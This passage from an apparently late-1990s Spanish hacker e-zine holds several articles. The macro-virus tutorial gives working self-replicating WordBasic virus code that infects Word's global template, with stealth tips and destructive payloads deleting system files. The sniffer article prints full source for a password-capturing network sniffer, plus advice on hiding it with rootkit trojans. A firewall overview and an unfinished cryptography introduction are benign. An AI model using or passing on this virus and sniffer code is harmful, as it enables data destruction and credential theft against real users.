AutoNew: Se ejecuta cada vez que se crea un docuMento nuevo.

AutoExit: Se ejecuta al salir de Word.


     No hace falta decir que estas macros autoMaticas se llaMan asi en todas
las versiones de Word.

     CoMo cabe esperar, si una plantilla global (lease NORMAL.DOT) contiene
una Macro autoMatica, todos los docuMentos que se abran con esa plantilla
provocaran la ejecucion de dichas Macros. Esta es una de las cosas Mas
iMportantes a tener en cuenta para escribir virus de Macro.
 


-----[ Replicacion

 

     Para infectar, un virus puede utilizar varios MecanisMos.
Uno de ellos es la utilizacion de la funcion MacroCopiar:

MacroCopiar PlantillaOrigen:MacroOrigen , PlantillaDestino:MacroDestino ,
Soloejecutable

donde, 

- soloejecutable : es un nuMero, que si es distinto de 0 hace que la Macro se
copie coMo solo ejecutable, y por tanto no se puede editar y ver su contenido.

 

     El proceso de infeccion es siMple. El docuMento infectado trae Macros
escritas en su codigo. Utilizando esta instruccion, puede copiar las Macros
que trae en la plantilla global, infectando asi el Word.

MacroCopiar "MiVirus:infecto" , "Global:AutoOpen" ,1

     Esto copia la Macro "infecto" de MiVirus.DOC a Global (NORMAL.DOT) coMo
AutoOpen y en Modo solo ejecucion. A partir de ese MoMento, todos los
docuMentos que utilizen esa plantilla, al ser abiertos provocaran la ejecucion
de la Macro.



-----[ Stealth



     En Word hay dos Maneras de acceder a un Menu donde podeMos ver, editar o
eliMinar las Macros de un docuMento:

     Mediante el Menu HerraMientas/Macros ..., donde se pueden editar (en caso
de no ser solo-ejecutables) , y eliMinar.

     Dentro de este cuadro de dialogo hay un boton (Organizador ...) que nos
Muestra otro cuadro donde se puede copiar Macros de un docuMento a otro o
eliMinar.

     La otra forMa es a traves de Archivo / Plantillas ... , donde taMbien es
accesible el Organizador.

     Hay Muchas forMas de ocultar esto, y asi evitar el acceso a nuestras
Macros viricas. PodriaMos desactivar estos Menus, eliMinarlos , incluso
eMularlos ... se creativo.



-----[ BoMbas 



     Las boMbas pueden hacerse taMbien de Muchas forMas. Una de ellas es crear
una Macro en un docuMento, y asignarle unas teclas rapidas de ejecucion.

Por ejemplo,

Sub MAIN

             FijarAtributos "c:\autoexec bat" ,0

             FijarAtributos "c:\command com",0

             FijarAtributos "c:\config sys",0

             Kill c:\autoexec bat"

             Kill "c:\command com"

             Kill "c:\config sys"


End Sub

 

     Este peque¤o codigo, eliMina todos los atributos del autoexec.bat,
config.sys y command.com (el "0" es el que lo indica). Despues los archivos
son eliMinados con la instruccion Kill.

     Si haceMos una Macro con esto, y le asignamos como tecla de ejecucion ,
por ejemplo, "izquierda", pulsar dicha tecla borraria los archivos.



-----[ EjeMplo: Pezque¤in.doc



     Para terMinar, aqui va un peque¤o ejeMplo de VBA virus Muy sencillo, para
entender lo explicado anteriorMente. TeneMos un docuMento infectado, llaMado
pezque¤in.doc ue contiene la siguiente Macro llaMada AutoOpen:

 

Sub MAIN

MacroCopiar NombreVentana$() + ":infeccion" , "Global:AutoOpen" , 1 ' Copia la
'Macro infeccion a la plantilla globlal con el noMbre AutoOpen, y en Modo solo
'ejecucion

MacroCopiar NombreVentana$() + ":AutoOpen" , "Global:infectado" , 1' Copia
      ' la Macro AutoOpen del docuMento infectado a
      ' la global con el infectado

End Sub

 

 

Y otra Macro llaMada infeccion ---->

 

 

Sub MAIN

On Error Resume Next ' Esta linea sirve para que en caso de error continue sin
                     ' Mostrar ningun Mensage de error 
                     ' que nos delataria, ya que en un lenguaje interpretado
                     ' los mensages de error aparecen segun van apareciendo.

ArchivoGuardarComo .Formato = 1     ' Guarda el archivo abierto con el formato
                                    ' de plantilla ( Nota: esto en un virus 
                                    ' real no seria viable, ya que guardaria
                                    ' cualquier archivo en ese forMato, 
                                    ' incluido un docuMento de solo texto,
                                    ' por ejeMplo, nota.txt)

MacroCopiar "Global:AutoOpen" , NombreVentana$() + ":infeccion" , 1   ' Copia
                            ' AutoOpen de la global al docuMento con el noMbre
                            ' infeccion


MacroCopiar "Global:infectado" , NombreVentana$() + ":AutoOpen" , 1   ' Copia
                                                    ' infectado coMo AutoOpen

ArchivoGuardar  ' Guarda el archivo de nuevo

If Dia(Ahora()) = 28 Then  ' Si es dia 28

 If Mes(Ahora()) = 4 Then ' del mes de Abril

 MsgBox "Acaba de ser infectado por el virus Pezque¤in", "Virus msg", 0

                                                        ' Muestra este mensage

 Open "c:\autoexec.bat" For Append As #1  ' Abre el archivo autoexec.bat para
                                          ' adicion

 Print #1 " del c\windows\*.* > null "    ' a¤ade esta linea al autoexec ;-)

 Close #1  ' Cierra de nuevo el archivo

 SalirWindows  ' Sale de Windows

End If

End If

End sub



-----[ DisclaiMer



     Este articulo esta escrito con fines puraMente educativos, para conocer
un poco Mas de lo que es capaz un ordenador, y a conocer los fallos que posee
para poder solucionarlos.

     Recordar que un virus no es un pedazo de software creado para destruir
y/o irruMpir en Maquinas ajenas, sino que es un ingenio inforMatico que
deMuestra la posibilidad de crear una vida artificial capaz de reproducirse
por si MisMa y evitar ser eliMinada.

El autor no se hace responsable de los da¤os que algun insensato pueda llegar
a producir.

                             moebiuz@biogate.com


                                  /^{M}^\

                               The flying eM


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + BREVES SOBRE INTERNET FIREWALLS


-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

BREVES SOBRE INTERNET FIREWALLS
by CrazyJM (MegadetH)
crazyjm@beer.com
irc hispano: #netsearch

[ Nivel medio ]

Hi pe¤a,en este articulo pretendo sentar unos breves conceptos sobre los tipos
y la construccion de firewalls para controlar el trafico entre una red interna
e Internet.

GLOSARIO
Algunos conceptos que aparecen en el articulo,si no sabes lo que son las
capas,el dns o una ethernet mas vale que dejes de leer y te vayas a visitar
la peich del penthouse o algo de eso XDDD

-ACL: Access control list (lista de control de acceso)conjunto de reglas de
       filtrado aplicadas a los routers.

-Autentificacion: Proceso de deteminar la identidad de un usuario que intenta
                  acceder a la red

-Autorizacion: Proceso de determinar que tipo de actividades estan permitidas
               (una vez autentificados se autoriza a los usuarios a diferentes
               tipos de acceso o actividades)

-Bastion (Host): Sistema que ha sido reforzado y configurado especialmente
                 para resistir un ataque,normalmente ningun ordenador de la
                 red externa puede acceder a la red interna sin pasar por
                 aqui.

-DMZ.Demilitarized zone (zona desmilitarizada): parte de la red que no
                        corresponde a la red interna ni a Internet,por ejemplo
                        un ISP puede colocar en esta zona,y protegidos por un
                        router los servidores HTTP,FTP etc que seria peligroso
                        que estuvieran en un host bastion.

-Firewall: conjunto de hardware y/o software montados sobre un sistema (o
           sobre varios) que controla el trafico entre dos redes aplicando una
           serie de reglas.

-Proxy Server: Reenvian los paquetes recibidos a otra red,sin permitir el
               trafico directo entre ellas,son usados en lugar de los routers
               a veces,algunos  incluyen utilidades de "logging" y auditoria
               asi como autentificacion,pueden implementar reglas de
               seguridad, como por ejemplo permitir las conexiones via FTP
               entrantes y no las salientes.

-Riesgo (Zona de ): Zona que se podria ver comprometida tras un ataque, por
                    ejemplo en una red conectada directamente a Internet toda
                    la red seria zona de riesgo.

-Router (encaminador o enrutador): Transfieren o dirigen los paquetes entre
                     distintas redes,tienen direcciones de red,con lo que los
                     paquetes enviados a otras redes pueden ser enviados a el
                     directamente que se encargara de dirigirlo a la red
                     destino. Aplicandoseles ACLs permiten aceptar o denegar
                     el trafico.


DE QUE NOS PROTEGEN Y DE QUE NO

     El firewall controla el trafico entre dos redes proporcionando proteccion
y funciones de auditoria,se configuran para proteger las redes internas del
trafico "malvado" del exterior,siendo la unica puerta de entrada a la red
interna, es mucho mas dificil un posible ataque, permiten el acceso
transparente a los usuarios de la red interna a la red externa.

     El firewall no nos puede proteger de ataques internos,de backdoors
colocadas en nuestra red interna,ni contra troyanos o virus que pueden llegar
por mediacion de algun usuario de la red interna que ejecuta un programa raro.
Ademas debe ser una pieza mas del engranaje de seguridad,por ejemplo si una
empresa tiene una red con informacion secreta o privada deberia ser aislada
del resto de la red corporativa.


DISE¥O DEL FIREWALL

     A la hora de dise¤ar el firewall se deben tener en cuenta varias cosas,
lo primero es saber que grado de proteccion auditoria etc se debe aplicar,
saber que servicios ha de ofrecer la red interna a la externa y viceversa,que
se debe denegar y que se debe permitir,otra cuestion es saber con que
presupuesto contamos,ya que podemos adquirir un producto completo por un
millon o costarnos solo un poco de tiempo y aplicarle unas ACLs a nuestro
CISCO. En la parte tecnica debemos pensar en si colocar un proxy, o un router,
o una combinacion de ambos, si hay que hacer un DMZ y como, si hay que aislar
totalmente la red interna,que tipo de red y subredes tenemos y que topologia
y protocolos usan y con que maquinas tarjetas y s.o. contamos


TIPOS DE FIREWALL

     Vamos a echar un vistazo a los tipos de firewalls mas comunes,hay dos
tipos basicos:

-Firewalls a nivel de red
-Firewalls a nivel de aplicacion

*Firewalls a nivel de red

     Estos fires toman sus decisiones basandose en el analisis de los
paquetes que reciben (fuente,destino,direccion, puertos..)se pueden
configurar para que acepten o rechacen los paquetes que no nos interesan, por
ejemplo se pueden configurar para que rechacen los paquetes provenientes de
determinada red,o que bloqueen todos los paquetes de nuestra red con destino a
determinada red (listas negras). El ejemplo tipico es un router (Cisco) aunque
estos no ofrecen una solucion super segura ya que solo trabajan en el nivel de
red y transporte y no en todos los niveles del TCP/IP y ademas no tienen por
regla general mecanismos de alerta. Tambien se puede usar un ordenador
corriendo algun s.o. tipo Unix con el kernel correctamente configurado y
corriendo software de filtrado de paquetes. (Linux es una excelente y
economica solucion corriendo ipfwadm o ipchains). Esto esta siendo solucionado
en los ultimos modelos que ya incluyen informacion sobre el trafico, estado de
las conexiones, y algunas  cosas interesantes como informacion sobre los
numeros de secuencia del TCP,ejemplo de esto son los Cisco Pix, Watchguard,
Checkpoint FW-1 o un ordenador corriendo openBSD con ip-filter.
Por otra parte,son rapidos y transparentes al usuario de la red interna.

*Firewalls a nivel de aplicacion

     Suelen ser hosts corriendo proxies servers,los cuales no pemiten el
trafico directo entre dos redes,es decir la red interna no se conecta con
Internet,el proxy transmite de una red a otra una copia de cada paquete
aprobado (salida o entrada)y se pueden usar por ejemplo,para controlar los
servicios que se desea ofrecer. Hay que tener en cuenta que al usar un proxy a
nivel de aplicacion los usuarios deben usar un cliente que permita trabajar
con proxy,y hay que usar un servidor proxy para cada servicio.
Suelen proporcionar  metodos sencillos de "log" y registro de trafico.
Dos de los paquetes mas populares para Unix (Linux inclusive)son el TIS
firewall toolkit y el SOCKS,y para NT el IIS y el Netscape Commerce Server
incluyen proxy servers.
Es mas seguro que el firewall a nivel de red,pero puesto que es un programa el
que analiza y reenviaes algo mas lento.
Hay una variante de este tipo conocida tambien como *Firewalls a nivel de
circuito,bien,este es exactamente igual al fw a nivel de aplicacion salvo que
no se requiere usar aplicaciones especificas para el proxy,creando un circuito
entre la aplicacion y el servidor proxy y usando un solo servidor proxy para
todos los servicios.


ALGUNAS ARQUITECTURAS

     Despues de ver los tipos mas comunes de firewalls vamos a ver ahora
algunas de las implementaciones de estos. Los tres tipos mas usados son:

-Simple Host Bastion (host con dos interfaces de red y filtro de paquetes)
-Host de doble conexion (host con dos interfaces de red separados y proxy)
-Filtrado de host (combinacion de router y host bastion)
-Filtrado de subred (combinacion de 2 routers y proxy)

*Simple Host Bastion

     Aunque normalmente son usados en conjunto con mas dispositivos, esta
forma simple de firewall,aun es usada por multitud de personas,(asi como el
colocar un router con una serie de ACLs solo),consiste en un ordenador
con dos interfaces (uno a cada red)y software de filtrado y analisis de
paquetes. Es poco seguro,ya que si alguien consigue acceder a el,la red
estara a su merced,y ademas no implementa un grado avanzado de proteccion,
requerido por muchas aplicaciones de red.

*Host de doble conexion

     Se usa un ordenador como linea divisoria entre Internet y la red interna
que utiliza dos interfaces distintos,uno para cada una de las redes.
Utilizan un conjunto de proxies (fw a nivel de aplicacion) o uno (fw a nivel
de circuito) para controlar el trafico entre las dos redes,hay que tener en
cuenta la necesidad de desactivar el encaminador interno del host,una vez
hecho esto los paquetes pasan por el punto de comprobacion,una capa de
aplicacion,que es el unico camino entre las redes,si el encaminamiento interno
esta activado los paquetes evitaran las funciones de la capa de aplicacion del
firewall,por ejemplo los Unix de Berkeley activan por defecto las funciones de
encaminamiento y hay que configurar y reconstruir el kernel.

*Filtrado de host

     Al utilizar este tipo se a¤ade un router que conecta la red con Internet
y a su vez hace funciones de filtrado,este router esta conectado a Inet por
una parte y a un ordenador (host bastion ),que a su vez esta conectado a la
red interna, por otra.El router solo puede ver este ordenador,que restringe el
acceso a la red interna,y asi mismo los usuarios de la red interna deben pasar
por el para salir a Internet.El router hace el primer y primordial filtrado y
el host bastion el resto. Los inconvenientes son que si el host se cae, se
acaba el trafico entre las redes,y ademas el host puede convertirse en un
cuello de botella mermando la rapidez del trafico entre las redes.

*Filtrado de subred

     Este tipo de arquitectura aisla aun mas la red privada de Internet,
incorpora dos routers y un servidor proxy,uno de los routers controla el
trafico de la red  local y el otro el trafico de Internet,entre ellos esta
situado el servidor proxy, es similar al modelo anterior pero el segundo
router situado entre el servidor proxy y la red local, proporciona mayor
proteccion para la red local y tambien frente al acceso interno inadecuado
al proxy server. Es bastante seguro,pero a su vez bastante mas caro que otros
tipos.


DIRECCIONES DE INTERES

     Por regla general todas las webs dedicadas al tema de la (in)seguridad
suelen tener documentacion sobre firewalls como hay muchas y las mejores las
conocemos todos paso de escribirlas, aqui teneis algunas otras:

-TIS firewall toolkit
www.tis.com

-SOCKS
www.socks.ben.com

-IIS internet information server para NT
www.moco$oft.com

-IPFWADM
www.xos.nl/linux/ipfwadm

-Firewall howto
http://sunsite.unc.edu/LDP/howto/firewall-howto.html

-Lista
majordomo@greatcircle.com
subscribe firewalls

*Imposible es el adjetivo de los imbeciles (Napoleon)*
Salud y hasta el proximo articulo.


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v0.9.1 (GNU/Linux)
crazyjm@beer.com
iD8DBQE3PGcPkn86pEO13boRAjlhAJ0YmZjgocuuA6wuXtwepYlLpCXLugCggH3A
0Htm3Y7BYiT8dJQ/ARPGOvA==e07B
-----END PGP SIGNATURE-----


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + SNIFFERS


      		    ------------------------------------
		    *	         Sniffers   	       *
		    ------------------------------------



En este texto voy a intentar explicar lo que es un sniffer y como funciona,
pero tampoco es gran cosa o sea que no espereis demasiado ;). Cuando me re-
fiera a sniffer lo hare al de ethernet de toda la vida, los sniffers como el
del icq, etc. son otra historia.


1.- Que es un sniffer?

Un sniffer se podria resumir como un programa que lo que hace es capturar
todos los datos que pasan a traves de una tarjeta de red. Para ello se basa
en un defecto del protocolo ethernet (el que se usa normalmente en las redes
locales). Este protocolo lo que hace es mandar la informacion a todos los
ordenadores de la red, aunque no vaya dirigida a ellos, luego son los propios
ordenadores los que basandose en la cabecera del paquete ethernet aceptan el
paquete o no, segun vaya dirigido a ellos o no. Normalmente todas las redes
tienen este defecto, aunque se puede evitar, por ejemplo hay algunos hubs con
'inteligencia' que en redes en estrella lo que hacen es examinar el encabezado
de los paquetes ethernet para ver a que direccion van dirigidos, y mandar la
informacion solo a ese ordenador. Pues como decia, el ethernet normalmente
manda los paquetes de datos a todas las estaciones de la red, entonces lo que
hace el sniffer es poner la tarjeta en modo promiscuo (promiscuous mode). El
modo promiscuo significa que la tarjeta capturara todos los paquetes ethernet,
aunque no vayan dirigidos a ella.


2.- Como trabaja un sniffer?

Nos habiamos quedado en el modo promiscuo (hay que decir por cierto que
algunas tarjetas no aceptan el modo promiscuo, evitando asi la instalacion de
sniffers), bueno, pues una vez hecho esto lo que hace el sniffer es filtrar
todos los paquetes ethernet. Si el sniffer almacenara todos los datos que
pasan por la tarjeta seria un lio impresionante, asi que lo que hace es
examinar los paquetes y mirar las peticiones a unos determinados puertos, como
por ejemplo el 23 del telnet, los mas comunes son el 21, el 23, el 110 y el
143. Luego toda la informacion que se transmite en esa conexion durante unos
determinados segundos, por ejemplo 30, la almacena en un fichero de log. Al
grabar los 30 primeros segundos grabara el login y el password, ya que van en
texto plano, a no ser que se utilice algun sistema de encriptacion como
kerberos, etc.

Asi que si por ejemplo tu has hackeado una maquina B (tienes que haberla
hackeado ya que necesitas ser root para colocar un sniffer), y una maquina C
hace un telnet a una maquina A (estando todas en la misma red local), tu captu
raras el login y el password de la maquina A. Mola, no? :).


3.- Codigo fuente.
 
Aqui pego el codigo de un sniffer para linux bastante practico.


		---- cortar aqui ----


/*
LinSniffer 0.03 [BETA]
Mike Edulla
medulla@infosoc.com
*/


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>


int openintf(char *);
int read_tcp(int);
int filter(void);
int print_header(void);
int print_data(int, char *);
char *hostlookup(unsigned long int);
void clear_victim(void);
void cleanup(int);


struct etherpacket
{
   struct ethhdr eth;
   struct iphdr  ip;
   struct tcphdr tcp;
   char buff[8192];
}ep;

struct
{
   unsigned long      saddr;
   unsigned long      daddr;
   unsigned short     sport;
   unsigned short     dport;
   int                bytes_read;
   char               active;
   time_t             start_time;
} victim;

struct iphdr  *ip;
struct tcphdr *tcp;
int s;
FILE *fp;

#define CAPTLEN 512
#define TIMEOUT 30
#define TCPLOG "tcp.log"

int openintf(char *d)
{
   int fd;
   struct ifreq ifr;
   int s;
   fd=socket(AF_INET, SOCK_PACKET, htons(0x800));
   if(fd < 0)
   {
      perror("cant get SOCK_PACKET socket");
      exit(0);
   }
   strcpy(ifr.ifr_name, d);
   s=ioctl(fd, SIOCGIFFLAGS, &ifr);
   if(s < 0)
   {
      close(fd);
      perror("cant get flags");
      exit(0);
   }
   ifr.ifr_flags |= IFF_PROMISC;
   s=ioctl(fd, SIOCSIFFLAGS, &ifr);
   if(s < 0) perror("cant set promiscuous mode");
   return fd;
}

int read_tcp(int s)
{
   int x;
   while(1)
   {
      x=read(s, (struct etherpacket *)&ep, sizeof(ep));
      if(x > 1) 
      {
         if(filter()==0) continue;
         x=x-54;
         if(x < 1) continue;
         return x;
      }
   }
}

int filter(void)
{
   int p;
   p=0;
   if(ip->protocol != 6) return 0;
   if(victim.active != 0)   
      if(victim.bytes_read > CAPTLEN)
      {
         fprintf(fp, "\n----- [CAPLEN Exceeded]\n");
         clear_victim();
         return 0;
      }
   if(victim.active != 0)
      if(time(NULL) > (victim.start_time + TIMEOUT))
      {
         fprintf(fp, "\n----- [Timed Out]\n");
         clear_victim();
         return 0;
      }                                                                                                                  
   if(ntohs(tcp->dest)==21)  p=1; /* ftp */
   if(ntohs(tcp->dest)==23)  p=1; /* telnet */
   if(ntohs(tcp->dest)==110) p=1; /* pop3 */
   if(ntohs(tcp->dest)==109) p=1; /* pop2 */
   if(ntohs(tcp->dest)==143) p=1; /* imap2 */
   if(ntohs(tcp->dest)==513) p=1; /* rlogin */
   if(ntohs(tcp->dest)==106) p=1; /* poppasswd */
   if(victim.active == 0)
      if(p == 1)
         if(tcp->syn == 1)
         {
            victim.saddr=ip->saddr;
            victim.daddr=ip->daddr;
            victim.active=1;
            victim.sport=tcp->source;
            victim.dport=tcp->dest;
            victim.bytes_read=0;
            victim.start_time=time(NULL);
            print_header();
         }  
   if(tcp->dest != victim.dport) return 0;
   if(tcp->source != victim.sport) return 0;
   if(ip->saddr != victim.saddr) return 0;
   if(ip->daddr != victim.daddr) return 0;
   if(tcp->rst == 1) 
   {
      victim.active=0;
      alarm(0);
      fprintf(fp, "\n----- [RST]\n");
      clear_victim();
      return 0;
   }
   if(tcp->fin == 1) 
   {
      victim.active=0;
      alarm(0);
      fprintf(fp, "\n----- [FIN]\n");
      clear_victim();
      return 0;
   }
   return 1;
}

   
int print_header(void)
{
   fprintf(fp, "\n");
   fprintf(fp, "%s => ", hostlookup(ip->saddr));
   fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));   
}

int print_data(int datalen, char *data)
{
   int i=0;
   int t=0;
   
   victim.bytes_read=victim.bytes_read+datalen;
   for(i=0;i != datalen;i++)
   {
      if(data[i] == 13) { fprintf(fp, "\n"); t=0; }
      if(isprint(data[i])) {fprintf(fp, "%c", data[i]);t++;}
      if(t > 75) {t=0;fprintf(fp, "\n");}
   }
}


main(int argc, char **argv)
{
   s=openintf("eth0");
   ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
   tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);   
   signal(SIGHUP, SIG_IGN);
   signal(SIGINT, cleanup);
   signal(SIGTERM, cleanup);
   signal(SIGKILL, cleanup);
   signal(SIGQUIT, cleanup);
   if(argc == 2) fp=stdout;
   else fp=fopen(TCPLOG, "at");
   if(fp == NULL) { fprintf(stderr, "cant open log\n");exit(0);}
   clear_victim();
   for(;;)
   {
      read_tcp(s);
      if(victim.active != 0) print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);
      fflush(fp);      
   }   
}

char *hostlookup(unsigned long int in)
{ 
   static char blah[1024];
   struct in_addr i;
   struct hostent *he;
   
   i.s_addr=in;
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
   if(he == NULL) strcpy(blah, inet_ntoa(i));
   else strcpy(blah, he->h_name);
   return blah;
}

void clear_victim(void)
{
   victim.saddr=0;
   victim.daddr=0;
   victim.sport=0;
   victim.dport=0;
   victim.active=0;
   victim.bytes_read=0;
   victim.start_time=0;
}

void cleanup(int sig)
{
   fprintf(fp, "Exiting...\n");
   close(s);
   fclose(fp);
   exit(0);
}

 		---- cortar aqui ----

Ahora mismo esta configurado para guardar los logs en el fichero tcp.log, en
el mismo directorio en el que este el sniffer, y capturara los primeros 30
segundos de los puertos 21 (ftp), 23 (telnet), 109 (pop2), 110 (pop3), 143
(imap), 513 (rlogin) y 106 (poppasswd). Los parametros los puedes modificar
como quieras para logear otros puertos, mas segundos, etc.. Al ejecutarlo
tienes que poner el &, a modo de ./snif &, para que quede corriendo en
segundo plano.
 

4.- Como ocultar su presencia.

Si pones un sniffer y no tomas varias precauciones poco durara en el sistema.
Para empezar, si el administrador o cualquiera usa el comando ifconfig vera
que la tarjeta esta en modo promiscuo, lo cual puede mosquearle :). Con el
comando ifconfig -a y un sniffer instalado se veria algo como:

eth0      Link encap:Ethernet  HWaddr 00:00:1C:04:11:C6
          inet addr:10.10.10.1  Bcast:255.255.255.255  Mask:255.255.255.0
          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0
          TX packets:0 errors:0 dropped:0 overruns:0
          Interrupt:11 Base address:0x6800 

Para evitarlo puedes instalar un troyano del ifconfig, que encontraras en mu-
chos rootkits, y que lo que hacen es ocultar el modo promiscuo.

Tambien, como cualquier otro programa ejecutado en segundo plano, dejara su
huella al hacer un ps para ver los procesos. La solucion a esto es la misma
que con el ifconfig, instalar otro troyano (esta vez para el ps), que
seguramente encontraras en el mismo rootkit que el anterior ;). Sino te
apetece andar buscando rootkits por ahi tienes los dos en
http://www.rootshell.com/, busca por "linux rootkit" o "lrk".

Aun asi despues de haber instalado los troyanos es posible detectar el sniffer
usando un programa que acceda directamente a la tarjeta y mire si el flag
promisc esta activado. Un programa como este ;) :


		---- cortar aqui -----


#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <errno.h>
#if defined (__linux__)
#include <linux/if.h>
#else
#include <net/if.h>
#endif
#define size(p) (sizeof(p))

int dev_flags=0,
    device_flags=0,
    set_look_all=0;

int
main(int argc, char **argv) {
 struct ifreq ifreq, *ifr;
 struct ifconf ifc;
 char buf[BUFSIZ], *cp, *cplim;

 if(argc <= 1)
        set_look_all++;

 if((dev_flags = socket(PF_INET, SOCK_DGRAM, 0)) < 0) {
        fprintf(stderr, "An error occured establiashing while establishing a socket\n");
        perror("socket");
        exit(1);
 }

 ifc.ifc_len = sizeof(buf);
 ifc.ifc_buf = buf;

 if(ioctl(dev_flags, SIOCGIFCONF, (char *)&ifc) < 0) {
        perror("SIOCGIFCONF");
        exit(1);
 }
 ifr = ifc.ifc_req;
 cplim=buf+ifc.ifc_len;
 for(cp = buf; cp < cplim;
                cp += sizeof (ifr->ifr_name) + size(ifr->ifr_addr))
 {
                ifr = (struct ifreq *)cp;

                if(argv[1])
                        if(strcmp(ifr->ifr_name, argv[1]) && !set_look_all)
                                continue;

                ifreq = *ifr;
                if(ioctl(dev_flags, SIOCGIFFLAGS, (char *)&ifreq) < 0)
                {
                        fprintf(stderr, "SIOCGIFFLAGS: %s (get interface flags): %s\n", ifr->ifr_name,strerror(errno));
                        continue;
                }

                device_flags=0; device_flags = ifreq.ifr_flags;
                fprintf(stdout, "%s: ", ifreq.ifr_name);

                if((device_flags & IFF_PROMISC) != 0)
                        fprintf(stdout, "Promiscuous: Sniffer detected.\n");
                else
                        fprintf(stdout, "Not-Promiscous: No Sniffers detected.\n");

                if(!set_look_all)
                        exit(0);
                else
                        continue;

 }
 if(!set_look_all)
         fprintf(stdout, "%s: Unknown device.\n", argv[1]);

}

		---- cortar aqui ----


5.- Instalar un sniffer en modo no promiscuo.


Aunque suene raro instalar un sniffer en modo no promiscuo si que tiene utili-
dad (al menos para mi). La principal ventaja es que es casi imposible que lo
detecten, ya que al estar la tarjeta sin el flag promisc aunque pasen un sca-
nners de sniffers no lo detectaran, y ademas te ahorras de meter un troyano
para el ifconfig y demas preocupaciones. Por el contrario solo capturaras los
paquetes ethernet que vayan dirigidos a ese ordenador, asi que no podras
pillar passwords de otros ordenadores directamente. Pero aunque en principio
no puedas capturar passwords de otros ordenadores al final acabas pillando
alguno. Me explico.. el sniffer logeara las sesiones que se hagan al propio
ordenador desde cualquier lugar de la red, por ejemplo, una conexion telnet.
Para empezar ya grabaras todos los logins y passwords de los usuarios que
hagan un telnet (incluido el root), y luego capturara los primeros 30
segundos del telnet, y es muy raro que en esos 30 segundos algun usuario no
haga un telnet o un ftp a otra maquina (no tiene pq estar en la misma red
local) quedando el login y el password de la maquina remota en el log. Si vas
a hacer esto lo mejor es que configures el sniffer para que solo logee el
puerto 23 (de telnet) y que capture los primeros 60 segundos o asi, para que
tengas mas posibilidades de que alguien haga una conexion a otra maquina.

Para instalar el sniffer en modo no promiscuo lo que tienes que hacer ejecutar
el sniffer, quedando corriendo en segundo plano y con la tarjeta con el flag
promisc activado. Luego para quitar el promisc puedes seguir dos caminos, o
quitarlo tu directamente con el ifconfig (esto funciona en linux, en otros ni
idea), siendo la orden algo como: "ifconfig eth0 -promisc". O utilizar este
programa que aparecio en el numero 53 del ezine phrack y que hace exactamente
lo mismo.


		---- cortar aqui ----

/*
 *  This is really dumb program.
 *  Works on Linux, FreeBSD and Irix.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  int sd;
  struct ifreq ifr;
  char *interface;
  int promisc;

  if (argc != 3) {
    printf("usage: %s interface 0|1\n", argv[0]);
    exit(1);
  }
  interface = argv[1];
  promisc = atoi(argv[2]);

  if ((sd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
    perror("socket");
    exit(1);
  }
  strncpy(ifr.ifr_name, interface, IFNAMSIZ);
  if (ioctl(sd, SIOCGIFFLAGS, &ifr) == -1) {
    perror("SIOCGIFFLAGS");
    exit(1);
  }
  printf("flags = 0x%x\n", (u_short)ifr.ifr_flags);
  if (promisc)
    ifr.ifr_flags |= IFF_PROMISC;
  else
    ifr.ifr_flags &= ~IFF_PROMISC;
  if (ioctl(sd, SIOCSIFFLAGS, &ifr) == -1) {
    perror("SIOCSIFFLAGS");
    exit(1);
  }
  close(sd);
}

		---- cortar aqui -----


Despues el sniffer quedara corriendo normalmente pero sin modo promiscuo.


6.- Despedida.

Vaya, siento que este articulo haya sido tan corto, espero que para otra vez
sea mas largo ;). Venga, un saludo a sp4rk, shyba, asturcon, ulan, dark y a
toda la pe¤a en general. Hasta otra.
 

RaiSe
raise@biogate.com
 

==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + CRIPTOGRAFIA


CRIPTOGRAFIA.
=============
by cafo
-------

Hola a todos.
Ya que no habia nadie que quisiera hacer un articulillo sobre la criptografia,
y dado que todavia hay gente que ni siquiera sabe lo que es el pgp, y mucho
menos como funciona, me he decidido a hacer una especie de introduccion
'multitudinaria' a la mayor parte de los sistemas de ocultacion de informacion
facilmente locallizables por la red.

Antes de empezar quiero aclara un par de cosillas:

      1.- Yo no soy criptoanalista, asi que ABSOLUTAMENTE TODO lo que aparece
      en este texto esta sacado de otros documentos o son fruto de mi propia 
      experiencia.

      2.- Espero que al acabar de leer este articulo tengais un nivel
      aceptable de criptografia a nivel de usuario. De todas formas, me
      planteo el espiritu del texto como meramente introductorio, asi que no
      pienso contestar ningun mail preguntando como se factoriza una curva
      eliptica ni ninguna cosa de esas (principalmente porque no tengo ni
      repajolera idea de como se haria ;)

Me ha parecido que hay una gran falta de base en lo que se refiere a 
criptografia, por lo que intentare no dar nada por supuesto (por lo menos
sabeis encender el ordenador, no? ;) y me limitare a ir al concepto de los
sistemas criptograficos sin entrar mas que lo imprescindible en las complejas
matematicas que usan. Debido a esto metere errores garrafales a proposito, y 
espero que los puristas no me crucifiquen por ello (que no es tan facil 
explicar en que se basa IDEA a gente que no sale de matematicas en base
10 :).


Introduccion. Un poco de historia.
==================================

En primer lugar habria que preguntarse: por que alguien tendria que cifrar la
informacion que posee o la que quiere enviar a un amiguete si lo hace todo
por internet, y el correo solo va a su destinatario?

Pues bien, respecto a la ultima afirmacion los usuarios experimentados de
